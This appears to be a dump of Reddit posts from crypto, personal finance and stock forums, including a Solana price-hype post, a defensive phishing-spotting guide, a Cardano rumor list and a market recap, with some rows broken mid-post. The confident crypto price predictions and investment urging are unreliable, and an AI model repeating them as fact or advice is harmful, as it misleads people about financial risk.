This is a huge deal, and the future of every industry as we know it. I don’t want to speculate and do your own research, but I see the value of the Solana network reaching 10 trillion dollars in the next ten years, with honestly infinite upside from there. The current valuation is 20 billion dollars fully diluted. Get in before the whales are able to see the potential and the stupid dudes on wall street finally realize what this means. I tried to keep the summary of solana objective but couldn't help my excitement from leaking out in some places. I am VERY excited to where this project is headed. The project has gained market cap quicker than any of the other coins in the top 100 because people are finally seeing how useful the network will be. It is currently sitting at 14 on [coinmarketcap.com](https://coinmarketcap.com) list of largest coins by market cap.

My opinion on other coins: I think polkadot and cosmos (not sure which) will still have a place in the future of the Web3.0. They are important interoperability protocols that connect large projects like vechain, theta, ethereum and Solana together. Projects like vchain and theta will not cease to exists because their own specialized chains they built for their function can currently work. However, long term, like 20+ years, I do think Solana will capture 95% of the blockchain and web3.0 space because supply chain blockchains (Vechain), video streaming(Theta), and DeFi would all benefit from increases in block finality speeds, higher tps, and lower fees.

Interesting fact, on average over the past week Cardano has bested its own record with 40,000 transactions per day. Ethereum has done 1,500,000 per day recently and this is essentially its max with current technology. Solana has done  86,400,000  transactions over the past day with ample room to do more. Let that sink in.

&amp;#x200B;

EDIT: I thought I had heard CAKE was moving to Solana. I now don't believe that is the case as I cannot find any information about it. Sorry for the confusion!

&amp;#x200B;

EDIT 2: XRP and Stellar have around 136 and 51 validator nodes respectively.

&amp;#x200B;

EDIT 3: Added an edit about being the most decentralized. It is not the MOST decentralized, but it definitely has potential to be. And how it is now, I would argue it is well on its way to becoming one of the most, if not the most, decentralized blockchains.

&amp;#x200B;

EDIT 4: The proper cost to run a node is likely around 3-4k. Alot of money, but not insane.",cryptocurrency

personalfinance,Wrapping My Head Around Graduate School,"Hi there,

This got kinda long... TLDR at the end. 

I'm heading to graduate school this summer to get my Master in Architecture degree. It's a three-year professional degree, and I have my undergraduate degree in English, so if I want to have a career as an architect--which I do--I need it. I've already sent my deposit to a private university that gave me a decent but not overwhelming scholarship, in a relatively affordable city, and I'm hugely excited to go there. I'm 27 now, and since college, I've been fairly diligent about putting aside savings into various accounts like high-interest savings, betterment, 401K, and a 529. Now I'm trying to plan for graduate school, but really struggling to understand the basic logistics of paying for school... My university estimates \~80K a year between tuition and cost of living, which I think is a safe (potentially a little high) number. 15K of that is covered by the scholarship, and I've qualified for 20.5K/year in direct unsubsidized loans. Obviously, that still leaves a significant gap of \~45K/year. I have 20K or so in my 529, and another \~10K in Betterment and high-interest savings accounts. I plan to work part-time at school once I get my feet under me, and I'll work full-time for both summers. 

I'm not asking Reddit to crunch all the numbers for me, but I'm trying to understand the absolute basics of paying for graduate school: at some point, the school will bill me for the amount not covered by scholarship and the direct loan, at which point I'll have to decide where to pull my money from. Is the simplest solution to take out a higher interest rate loan like a Grad Plus and pay that off from whatever accounts makes the most sense over time? Should I see if I can borrow money from family instead so that I'm not taking on high-interest rate debt? Should I wait to start paying off loans so that my money currently invested can grow a little faster than the interest rate on my loans and then start pulling that money out to pay down my loans when I'm done with school? Am I totally missing something here? 

I'm an open book, so if I've left out obvious information that would be useful, feel free to ask. I'm also very willing to read and research, but in my googling around I've encountered a lot of strategies for paying for school like various loans, scholarships, grants, etc. which is all good information, but it doesn't help me grasp what I should do with my money when, and how I should think about the actual exchange of currency between me, the school, my 529, and federal loans. If you have any resources you think I'd get a lot out of, please send them my way...

TLDR: I'm heading to graduate school. I know I'm taking on debt. It's worth it to me. I'm trying to understand the logistics of graduate school payment, and how I should handle paying off debts or paying for tuition directly with my existing savings.",finance

CryptoCurrency,Tips and tricks from my line of work on how to identify phishing emails.,"Part of my job at work is investigating and responding to phishing emails within the organization. So here's a few tips and tricks to help identify them and stay safe. \*Email was made for educational purposes.

First thing first, you see a notification like this and you start to freak out

&amp;#x200B;

https://preview.redd.it/pyrtuvik0yv61.png?width=360&amp;format=png&amp;auto=webp&amp;s=fa7c19ec8dd075ce2b6a51d51b1a57c409fe5076

Upon clicking the notification you see this email:

&amp;#x200B;

https://preview.redd.it/axbzhbpl0yv61.png?width=703&amp;format=png&amp;auto=webp&amp;s=b0d2d734e8d7acb6312f85bd264a51602049c673

# The Most Effective Phishing Emails are the ones that create a sense of urgency

Attackers pray on your emotions, you see this email and start to freak out and click the link without even thinking.

Step 1.)  Remain Calm, before you do anything actually analyze the email.

Step 2.)  Check the sender, in the notification and the email above the name is 'Coinbase', attackers will also try to mimic emails similar to the legitimate one in this case its `Support_Coinbase_no-reply` and the domain is `protonmail.com`, but attackers may use domains similar to coinbase such as switching out the 'i' with a 'l' ex.)  `@Colnbase.com`  to make it more realistic (the site is currently for sale, so might realistically be a attack in the future). Also, when creating this email I noticed a lot of emails similar to this was already taken.

&amp;#x200B;

https://preview.redd.it/2tkwxaqu0yv61.png?width=777&amp;format=png&amp;auto=webp&amp;s=f3779588e4bcadea775a61dea6d3281f03ec8a8e

The sender may also be spoofed and look like it came from a legitimate sender, for that we can check the headers, which I will cover later.

Step 3.) Language, often times phishing emails are rushed and loaded with spelling errors, in this email you can see account is spelled wrong, along with a missing apostrophe in didn't. And as stated they will try to rush you with a sense of urgency so look out for keywords such as 'urgent' / 'immediately'

&amp;#x200B;

https://preview.redd.it/lwjshw7y0yv61.png?width=540&amp;format=png&amp;auto=webp&amp;s=0108a0c2053ee0bf9dee97601d8fb1368bc02abf

Step 4.) Links, generally i'd advise never clicking links in emails and just visiting the site through a bookmark you set or typing is in the address bar (searching through a search engine can have ads that lead to malicious sites above the legitimate one)

&amp;#x200B;

https://preview.redd.it/q5csmk811yv61.png?width=323&amp;format=png&amp;auto=webp&amp;s=0a34503645200d7f0942737d7ce9256e02b10864

For this you can hover your mouse over the link to see the link is actually to reddit and not Coinbase Support, but this could of lead to a phishing site where you enter your credentials to Coinbase, and if you don't have **2FA** activated they now have the ability to login.

You can also right click and hit 'Copy Link Address' and use a tool such as [https://urlscan.io/](https://urlscan.io/) to scan URLs to see where it goes (make sure to change it to private search incase it contains personal info) or check the url against site such as [https://transparencyreport.google.com/safe-browsing/search](https://transparencyreport.google.com/safe-browsing/search), [http://phishtank.org/index.php](http://phishtank.org/index.php), or [https://www.virustotal.com/gui/](https://www.virustotal.com/gui/) to see if its known.

&amp;#x200B;

Headers:

First, to find out how to get the headers for your mail service: [https://mxtoolbox.com/Public/Content/EmailHeaders/](https://mxtoolbox.com/Public/Content/EmailHeaders/)

after getting the headers for the email you can paste it in the analyze headers section (For analyzing headers I use: [https://mxtoolbox.com/EmailHeaders.aspx](https://mxtoolbox.com/EmailHeaders.aspx))

What I generally look at is:

* smtp.mailfrom
* Return-Path
* From:
* Reply-to/Bounces-to

which should all line up with the the legitimate sender / company.

Quick Protections:

* Have a email dedicated to crypto, you can check your email in [https://haveibeenpwned.com/](https://haveibeenpwned.com/) to see your email has been part of any breaches (Any passwords to those breached sites, assume they have been compromised and change them)
* Some sites have a option to set a Anti-phish code, where they display a code that you set that is then displayed in all legitimate emails from that site.",cryptocurrency
personalfinance,Question on 401k distribution - 10% penalty from hardship,"Greetings everyone!

I was hoping to get some clarification on taking an early withdrawal from my 401(k).  In the following scenario, could someone advise if I would have to pay the 10% early withdrawal fee?

Due to medical reasons, I have to install a walk-in tub.  This is not a medically covered benefit under my insurance, and therefore I have to fund it via my 401k.  I understand that since I'm not yet in my 50's, I am stuck with the normal federal taxes.  My doctor has agreed to write whatever is needed for purposes of the IRS.  

My question is, since the cost of this exceeds 10% of my AGI, would this count as an ""unreimbursed medical expense"" under 72(t)(2)(B), or would it not qualify simply because it's not a medical expense as defined by being billable under my insurance?

Would there be any additional tax deductions that I could claim when it came time to file for next year in regards to this?

personalfinance,Investing in long term index funds a IRA vs DIY,"I want to understand how most Americans do this. Lets say you want to save up for a downpayment for a house in 5 to 10 years. Obviously letting your cash sit in the bank is a bad idea, and a logical choice would be to put some of it in a Index Fund (eg. Vanguard funds) or even Bonds, (HYSA no longer due to very low interest rates) via a brokerage (eg. Fidelity)

If I instead put those funds in a IRA or a 401k (and invest it in index funds / bonds), I understand that I save on taxes now, but I wont be able to take out the funds in 5 to 10 years when i want to buy a house etc. Is that correct?

personalfinance,Refinance brand new mortgage,"Hey Personal Finance,

I am about to close on a new build house. I locked in an interest rate with the preferred mortgage company in March (when rates were going up) and the interest rate now seems a bit high. 3.15 percent.

I can't shop around for a new mortgage because I got 10k off the purchase price for using them. I read through the documents and I didn't see anything about prepayment penalties.

So here is my question:
1. Is there usually anything that prevents me from getting a new mortgage immediately after I close?
2. Rates are still low and some mortgages appear to have no fees. It looks like I can cut my interest rate by .15 to .25 with no cost. This seems to good to be true. Is it?

investing,Why REITs Are in a position to outperform equities on a risk-adjusted basis,"1. The corporate tax hike will affect most corporations, but REITs are ""pass through"", so they will be unaffected by this as they do not pay corporate taxes.

2. The capital gains and qualified dividend tax hike won't affect REITs either, because they're already taxed as ordinary income(other than QBI deduction)

3. Biden's targetting of ""like kind exchange"" tax deferrals won't affect REITs, but investors that invested in real estate directly may have less of a reason to do so over just investing in REITs.

4. Real estate has historically done well during periods of inflation, and many leading indicators for inflation are present(High commodity prices, shortages, high demand, stimulus, M2 growth, unemployment dropping, rising inflation expectations)

5. REITs have yet to recover as much in share price as much as the equity market. While equities are trading at far higher P/E ratios than they were a year ago, REITs FFO to price ratios are still looking cheap.

6. If you look at 1999 when equities were starting to trade at similar P/E Ratios, REITs went on to perform well during the tech bubble crash up until the real estate bubble several years later.

7. Low interest rates present an opportunity for leveraged investment",finance

“With inflation running persistently below this longer-run goal, the Committee will aim to achieve inflation moderately above 2 percent for some time so that inflation averages 2 percent over time and longer‑term inflation expectations remain well anchored at 2 percent. The Committee expects to maintain an accommodative stance of monetary policy until these outcomes are achieved. The Committee decided to keep the target range for the federal funds rate at 0 to 1/4 percent and expects it will be appropriate to maintain this target range until labor market conditions have reached levels consistent with the Committee's assessments of maximum employment and inflation has risen to 2 percent and is on track to moderately exceed 2 percent for some time. In addition, the Federal Reserve will continue to increase its holdings of Treasury securities by at least $80 billion per month and of agency mortgage‑backed securities by at least $40 billion per month until substantial further progress has been made toward the Committee's maximum employment and price stability goals. These asset purchases help foster smooth market functioning and accommodative financial conditions, thereby supporting the flow of credit to households and businesses.”

Let's go....

Newly covered today:

1. The Africa Bird lands a few days early!!!!!!!! It’s a deal with the Ethiopian Ministry of Education to provide a Cardano ID solution and unified records system for 5 million Ethiopian students. Charles says there will be more news tomorrow at the Africa Special. [https://www.nytimes.com/2021/04/27/business/dealbook/tesla-earnings-bitcoin.html](https://www.nytimes.com/2021/04/27/business/dealbook/tesla-earnings-bitcoin.html).

2. We’re getting reports from Army of Spies member /u/ [ricklepicklemydickle](https://www.reddit.com/user/ricklepicklemydickle) that World Mobile is reporting in its telegram group that it will be dropping some news tomorrow!
3. A new Cardano metrics platform has launched! [https://cardanowaves.com/](https://cardanowaves.com/)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
4. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
5. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
6. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
7. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
8. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
9. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
10. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
11. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

12. Cardano hits 400k delegators! [https://twitter.com/RichardMcCrackn/status/1377732956194766850](https://twitter.com/RichardMcCrackn/status/1377732956194766850)
13. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture. [https://www.yahoo.com/entertainment/graph-blockchain-announces-acquisition-cardano-110000210.html](https://www.yahoo.com/entertainment/graph-blockchain-announces-acquisition-cardano-110000210.html)

15. Occam.fi is creating a defi launchpad on Cardano that will be called OccamRazer. [Cointelegraph OccamRazer Article](https://cointelegraph.com/press-releases/occamrazer-the-first-defi-launchpad-for-cardano)
16. Orion Protocol is aiming to be the first liquidity aggregator on Cardano. [https://coinmarketcap.com/el/headlines/news/orion-protocol-and-cardano/](https://coinmarketcap.com/el/headlines/news/orion-protocol-and-cardano)
17. How hard is learning Haskell from scratch? Today’s youtube companion to this post describes my experience so far learning Haskell as a beginner with little programming experience. [https://haskellbook.com/ ](https://haskellbook.com/)[http://learnyouahaskell.com/chapters](http://learnyouahaskell.com/chapters) [Derek Banas Youtube Haskell Tutorial](https://www.youtube.com/watch?v=02_H3LjqMr8)
18. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)
19. Cardano NFTs get some coverage on CoinTelegraph. [https://cointelegraph.com/news/wild-west-as-developers-macgyver-highly-popular-nfts-on-cardano/amp](https://cointelegraph.com/news/wild-west-as-developers-macgyver-highly-popular-nfts-on-cardano/amp)
20. Emurgo Academy for blockchain education? Has anyone heard of this? [https://twitter.com/emurgo\_io/status/1378346801598754816](https://twitter.com/emurgo_io/status/1378346801598754816)
21. Onyx Stake Pool announces Cardano’s first Quantum block! [https://twitter.com/onyxstakepool/status/1378848216578412547](https://twitter.com/onyxstakepool/status/1378848216578412547)
22. SpaceBudz published a great article on how they were able to distribute 10,000 NFTs. [https://spacebudz.medium.com/how-we-pulled-off-the-sale-9dbe54c30ba5](https://spacebudz.medium.com/how-we-pulled-off-the-sale-9dbe54c30ba5)
23. For those learning Haskell/Plutus, check out this awesome one hour video from 2012 with Brian Beckman that introduces monoids and monads in a very non-scary way. [https://www.youtube.com/watch?v=ZhuHCtR3xq8](https://www.youtube.com/watch?v=ZhuHCtR3xq8)
24. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)

26. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
27. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
28. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
29. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
30. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
31. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Ethiopian Prime Minister Abiy Ahmed outlines how he will liberalize the telecom industry in his country and lays out his four pillars of “Digital Ethiopia 2025”: digital ID, interoperable payment platforms, e-government applications, and e-commerce. [https://telecomreviewafrica.com/index.php/en/articles/exclusive-interviews/2240-liberalization-of-telecoms-in-ethiopia](https://telecomreviewafrica.com/index.php/en/articles/exclusive-interviews/2240-liberalization-of-telecoms-in-ethiopia)
33. Beta version of the Emurgo dApp Connector (a Metamask Killer) is out! As planned, it runs on Ergo for now but Cardano later. [https://twitter.com/emurgo\_io/status/1381675733605474307](https://twitter.com/emurgo_io/status/1381675733605474307)
34. Charles did a quick but very interesting interview with Alessandro Konrad, co-founder of SpaceBudz. [https://www.youtube.com/watch?v=IxlL3RA3UyI](https://www.youtube.com/watch?v=IxlL3RA3UyI)
35. Emurgo Traceability Solution being used to track coffee from Indonesia to China. [https://twitter.com/emurgo\_io/status/1381617916018319363](https://twitter.com/emurgo_io/status/1381617916018319363)

37. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right? [https://cointelegraph.com/press-releases/bitcoincom-to-accommodate-occams-ethereum-to-cardano-cross-chain-bridge](https://cointelegraph.com/press-releases/bitcoincom-to-accommodate-occams-ethereum-to-cardano-cross-chain-bridge)
38. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa: 1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize. Here’s the LunarCrush interview. All queued up to the exact spot for the Africa discussion--[https://youtu.be/GWpqNPdOf9E?t=3804](https://youtu.be/GWpqNPdOf9E?t=3804)
39. Occam has announced that the Occam Razer IDO (Initial Dex Offering) is completed and that it sold out in 30 seconds. There was no lack of criticism for the way in which the IDO was carried out. [https://twitter.com/OccamFi/status/1382377423757570052 ](https://twitter.com/OccamFi/status/1382377423757570052)[https://twitter.com/DCdoso/status/1382406641404977157](https://twitter.com/DCdoso/status/1382406641404977157)
40. Cardano and Ergo got some positive coverage in CoinTelegraph. [https://cointelegraph.com/news/life-beyond-ethereum-what-layer-one-blockchains-are-bringing-to-defi/amp](https://cointelegraph.com/news/life-beyond-ethereum-what-layer-one-blockchains-are-bringing-to-defi/amp)
41. Thought: the crypto knowledge stack as to adoption is really tripartite: 1) technical, 2) crypto sentiment, &amp; 3) legacy sentiment toward crypto (including financial sector, central banks, regulatory, and general public).
42. The Cardano Foundation drops the Native Token Registry! [https://twitter.com/CardanoStiftung/status/1382700374755323916](https://twitter.com/CardanoStiftung/status/1382700374755323916)

47. Yesterday was “Get ADA DAY” with the end of Epoch 259. I hope everyone straight killed it on staking rewards!
48. Now there is an app that will show you all of your Cardano NFTs. [https://twitter.com/nft\_craze/status/1383196757622878208](https://twitter.com/nft_craze/status/1383196757622878208)

53. There is really good information about Cardano’s deals in Africa and its developer adoption strategy in this Cardano Chats interview that kind of flew under the radar. Probably worth a listen if you haven’t heard it. [https://youtu.be/m6TeNLvMTXI](https://youtu.be/m6TeNLvMTXI)

55. We just experienced a big flash crash in price. A prime suspect is the drop in hash rate in BTC due to the Blackouts in China. Is the crypto space ready to accept that Nakamoto style consensus on PoW leads directly to unacceptable levels of centralization? This has been the dirty secret of PoW crypto and its decentralization loving enthusiasts for years. [https://bitcoinmagazine.com/business/bitcoin-mining-hash-rate-drops-as-blackouts-instituted-in-china](https://bitcoinmagazine.com/business/bitcoin-mining-hash-rate-drops-as-blackouts-instituted-in-china)
56. Charles posted a somewhat cryptic tweet that read “Omega + Hydra + Mithral = GG”. The Ourobors Omega, Ouroboros Hydra, &amp; Mithral parts we’ve covered before. Omega is a capstone rollup of Praos (2017), Genesis (2018), + Redux, +Chronos, +Ledger Combiners, +some other things from the rest of the space. Hydra is layer two. Mithral is trustless light wallets via zk-SNARKs. Guesses as to the “GG” ranged from “Good Game” (as in game over for competitors) to “Goguen”. See today’s video at the link above for more discussion on this. [https://twitter.com/IOHK\_Charles/status/1383792375860924424](https://twitter.com/IOHK_Charles/status/1383792375860924424)

63. Shahaf Bar-Geffen, CEO of COTI (the first recipient of a Cardano CFund investment), says he just finished recording his segment in the Africa special which he mentioned was airing at the end of April prior to the IOHK announcement of April 29th. He also said: 1) ADA Pay may be ready in early May or maybe even late April; 2) there will be a big launch for ADA Pay and once the Africa Special airs “everything will connect”; 3) “people are probably not getting how big this is….but you will down the line”; 4) COTI integration with a major exchange is happening, progress is not as quick as they would like, but it’s progressing; 5) last week they released the possible designs for debit cards, they are even considering some designs submitted by the community; 6) and iOS and Android integration is coming along nicely and well on the way.

67. Recap from yesterday: the Africa Special Announcements revealed some additional puzzle pieces 1) COTI’s AdaPay is possibly the larger payments infrastructure puzzle piece, 2) [payway.et](https://payway.et/) is possibly the local payments puzzle piece, 3) [yellowcard.io](https://yellowcard.io/) is possibly the local coin exchange puzzle piece, and 4) World Mobile (not mentioned at [africa.cardano.org](https://africa.cardano.org/) AFAIK) may be the network connectivity puzzle piece. I think they are going to connect a lot of disparate pieces for us on the 29th.

The interesting items are 1) it appears they are purporting to somehow insure their community backers against certain financial losses with caveats, 2) they plan to fund projects prior to token launch through token vouchers, and 3) it sounds like they are building a DEX called Card Swap. Notice that the “insurance” comes with caveats. They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad? I have no idea.

I've been on and off the phone with my bank since. I only just recently found out. I'm so mad but I know it's not the lady on the phone's fault. 

I was supposed to get paid via direct deposit last night, and I kept checking my account and it just said there was an ""error on their end."" I got a call an hour ago and the lady said ""have you spoken to anyone in the past couple days?"" ""No, not regarding the bank,"" and she just went ""okay because your bank account was closed"" and I just said ""oh??"" And her only response was ""and apparently you didn't know that, so I'm going to go talk to Lisa over there and see if she knows what's going on with your account. We'll call you back, okay?"" And I didn't hear from anyone until I called back a few minutes ago. It's very clear in her voice that she has no idea what's going on, and I don't know if the bank is understaffed or what, but she said ""a banker is looking into it"" and she ""hasn't received a response yet."" I was told I'd receive a call before they close in 2 and a half hours. I swear I heard a confused and frustrated sigh at one point, but I may have misheard. 

Any advice? Should I have been a bit more stubborn? My boss said that the direct deposit already went out, so they can't just cut me a physical check instead. All the money I have is presumably locked in my closed account, or is off in the ether. Advice or stories from others who have been here would be greatly appreciated",finance

CryptoCurrency,"""Bitcoin and Ethereum do not compete because they have completely different purposes."" Not really...","""Bitcoin and Ethereum do not compete because they have completely different purposes.""  I hear this from a lot of people, but I also hear that they DO compete from an increasing number of voices.  How come so many investors and analysis are simultaneously reaching the same conclusion: ETH is significantly superior to BTC in every aspect pertaining monetary networks, with the  exception that BTC has already reached ossification. Ethereum will enter ossification in 2-3 years. When it happens, ETH is projected to:

* Have near net 0% issuance, and potentially becoming a deflationary asset.
* Provide at least 2.5% APY denominated in a non-inflationary asset with negligible risk exposure.
* Serve as a non-custodial/no counterparty risk monetary asset for any economic activity operated within its network.
* Virtually eliminate operational costs by discontinuing mining. PoS is in many ways demonstrably superior to PoW.
* Increased throughput will handle at least 100,000 tps.
* Include full operational programmability without sacrificing decentralization properties that are critical to the value proposition of monetary networks.
* Operate an alternative financial system that is  inclusive and immune to censorship. Imagine how using the Ethereum network (with stable coins) will help countries facing monetary/banking collapses.
* Have a monetary policy that is sustainable EVEN in the absence of network fees.

&amp;#x200B;

Do you see why it is difficult to agree that ETH does not compete with BTC because they are totally different things? There is room for intelligent disagreement, but the matter of the fact is that a lot of investors believe in an alternative narrative. This means BTC and ETH DO compete for capital allocation even if these views are invalid.

&amp;#x200B;

The BTC vs ETH debate reminds me of how fax machines did not compete with the internet because ""they were totally different things"".  That is entirely true, but the first is just a small subset of what the second is capable of doing. In fact, the internet does almost everything fax machines do, except better. The physical capabilities of fax machines were replaced by other devices, and the fax became obsolete.

&amp;#x200B;

Billionaire investor Mark Cuban has figured this out. Big banks and financial institutions are starting to catch up too. These are a couple of revealing quotes :

"" I own a lot of Ethereum because I think it’s the closest to a true currency. "" - Mark Cuban

""Over the course of 2020 we are seeing a new group of investors who are Ethereum-first and in some cases Ethereum-only. There’s a growing conviction around Ethereum as an asset class."" - Grayscale

""BTC is more of a crypto commodity than currency &amp; competes with gold as a store of value, whereas ETH is the backbone of the crypto-native economy. To the extent owning a share of this potential activity is more valuable...ETH should outperform BTC over the long run "" - JP Morgan.

personalfinance,State of CA says I owe taxes even though Safe Harbor Rule applies,"**Background**:

* Lived in California, moved to the UK in March 2017 with no intention of moving back (ie. no longer domiciled)
* Still live in UK
* File federal taxes every year, excluding all income as foreign
* Have not filed with CA from 2018 onward

**The Situation:**

CA Franchise Tax Board sent me a letter claiming I owe taxes for 2018.

Their primary reasoning for this is that I had a 1099-K from a California-based company ([Gumroad.com](https://Gumroad.com)) which processed credit card payments to me (I sell a software product on their site).

I replied with their questionnaire stating I should not have to file with them because:

1. Gumroad is not an employer or a company I do work for, they just happen to be based in CA
2. I meet the requirements for the **Safe Harbor Rule (FTB Publication 1031, page 4):**
   1. I have been living outside California under an employment contract since March 2017
   2. I do not have intangible income exceeding $200,000
   3. I am not living abroad to avoid paying income tax
   4. I have not been to California for any amounts of time exceeding 45 days

CA FTB replied stating I need to file a 540nr because of the 1099-K filed by Gumroad, Inc. They did not address the Safe Harbor Rule I cited.

**Questions:**

Should I appeal this again, highlighting (again) the Safe Harbor Rule, or another rule, or is FTB completely right in that I still must pay taxes to them as a nonresident?

If I am on the hook to pay them taxes for 2018, would it follow that I'll need to for *every* year from then on since I still receive payments from Gumroad and have every year since moving to the UK? Can CA indefinitely expect taxes from me despite no longer living there and permanently residing in the UK?

stocks,"Here is a Market Recap for today Wednesday, April 28, 2021","The stock market fell on Wednesday, with all three major indexes closing modestly red as market participants continue to digest the corporate earnings season and new commentary from the Federal Open Markets Committee. 

The FOMC said the effective distribution of the vaccine in the US has improved economic conditions but reiterated interest rates will remain near-zero and the asset purchasing program in place. The Fed said, “Amid progress and strong policy support, indicators of economic activity and employment have risen.” The committee remains optimistic about the rebound in economic activity, describing the most affected sectors as “having shown improvement”, but shows no signs of slowing quantitative easing or raising interest rates. With more than 8 million people still out of jobs compared to pre-pandemic levels, FOMC reiterated its commitment to supporting the economy.

